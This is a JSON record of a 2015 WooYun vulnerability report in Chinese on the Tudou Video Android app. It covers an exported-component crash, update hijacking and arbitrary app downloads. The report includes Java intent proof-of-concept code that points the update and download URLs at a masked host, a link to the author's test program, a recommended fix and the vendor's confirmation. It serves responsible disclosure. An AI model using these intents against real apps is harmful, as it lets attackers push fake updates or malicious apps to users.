{"id": 83245, "wybug_id": "wooyun-2015-0148477", "wybug_title": "土豆视频安卓版拒绝服务/升级漏洞/任意app下载", "wybug_corp": "土豆网", "wybug_author": "tmplazy", "wybug_date": "2015-10-22 10:21", "wybug_open_date": "2016-01-20 14:10", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["客户端程序设计错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-05：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向公众公开  简要描述： 土豆视频安卓版存在一处拒绝服务，2处升级漏洞，2处游戏任意下载漏洞 详细说明：  \n\n首先是最新版本。\n\nactivity组件暴露，\n\n构造一个空intent，可以导致其崩溃。\nIntent intent = new Intent();                    intent.setComponent(new ComponentName(\"com.tudou.android\", \"com.tudou.ui.activity.CacheEditActivity\"));                    startActivity(intent);\n\n\n接着看土豆视频的升级漏洞。\n\nStartActivityService这个服务可以通过外部访问。\n\n从上面的代码可以看出当传入的PushMsg的type为1时可以会进行更新，而且                updateurl ，updateversion，updatecontent都是可以控制的，所以写下代码\nPushMsg pushMsg = new PushMsg();                    pushMsg.type = 1;                    pushMsg.updateurl = \"http://**.**.**.**/apps/com.qiyi.video/download\";                    pushMsg.updatecontent = \"test\";                    pushMsg.updateversion = \"5.5\";                    Intent fake = new Intent();                    fake.setClassName(\"com.tudou.android\", \"com.tudou.push.StartActivityService\");                    fake.putExtra(\"PushMsg\", pushMsg);                    startService(fake);\n代码中的PushMsg不需要自己实现，将土豆视频反编译，再将自己的程序反编译，将土豆视频中的PushMsg.Smali替换自己程序的的PushMsg.Smali就可以了。我将更新链接指向了豌豆荚的爱奇艺视频。。。\n\n\n\n\n\n可以看到安装时显示的是爱奇艺的app。如果伪造的像一点的话危害还是非常大的。但是仅仅将此处的服务exported改为false，依旧不能避免这种升级漏洞。我又发现了一处问题，即使这里改exported为false仍然可以利用。\n\n图中的EmptyActivity可以通过外部访问。\n\n可以看到通过构造intent的action不为download，依旧可以启动StartActivityService。\nPushMsg pushMsg_1 = new PushMsg();                    pushMsg_1.type = 1;                    pushMsg_1.updateurl = \"http://**.**.**.**/apps/com.qiyi.video/download\";                    pushMsg_1.updatecontent = \"test\";                    pushMsg_1.updateversion = \"5.5\";                    Intent fake_1 = new Intent();                    fake_1.setClassName(\"com.tudou.android\", \"com.tudou.push.EmptyActivity\");                    fake_1.putExtra(\"PushMsg\", pushMsg_1);                    fake_1.setAction(\"test\");                    startActivity(fake_1);\n成功利用后的结果跟之前的是一样的。最后是app任意下载漏洞。土豆视频里面有一个游戏中心。问题同样出自StartActivityService。\n\n当PushMsg的type为6时，会启动GameCenterHomeActivity，而各种参数都是可以控制的。\nPushMsg pushMsg_2 = new PushMsg();                    pushMsg_2.type = 6;                    pushMsg_2.pkg_name = \"com.tudou.android\";                    pushMsg_2.content=\"test\";                    pushMsg_2.url =\"http://**.**.**.**/apps/com.tudou.android/download\";                    pushMsg_2.icon = \"\";                    pushMsg_2.ver_code = 123;                    pushMsg_2.game_id = \"111\";                    pushMsg_2.source = \"test\";                    Intent fake_2 = new Intent();                    fake_2.setClassName(\"com.tudou.android\", \"com.tudou.push.StartActivityService\");                    fake_2.putExtra(\"PushMsg\", pushMsg_2);                    startService(fake_2);\n  \n\n从图中可以看出有1款游戏待安装。想下载什么应用可以通过PushMsg的url进行构造，我上面下载的是豌豆荚下的土豆视频，如果被拿过来恶意利用可以执行任何地方，就实现了任意app下载。伪造的像一点让用户点击安装就后果不堪设想了。同样的出现这样问题的不止这里。上面这个是通过StartActivityService启动GameCenterHomeActivity。然而GameCenterHomeActivity是直接可以通过外部应用访问的。\n\n也就是说直接构造恶意intent，启动GameCenterHomeActivity可以带到app下载的目的。最后的话StartActivityService根据pushMsg的type不同还可以做很多事情。还能下载视频。。一堆问题。。。。最后我写的验证程序http://**.**.**.**/s/1qWnCR4C  提取码94ve   漏洞证明：  \n\n\n\n\n\n   修复方案：  修改组件的exported属性，还有上面提到的EmptyActivity有Log.i(\"pushtest\", \"emptyactivity启动\");这么一句语句，猜测这个activity是开发过程中留下的，如果是的话应该处理掉。   版权声明：转载请注明来源 tmplazy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-10-22 14:09 厂商回复： 漏洞说明详细，已通知开发，多谢tmplazy 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}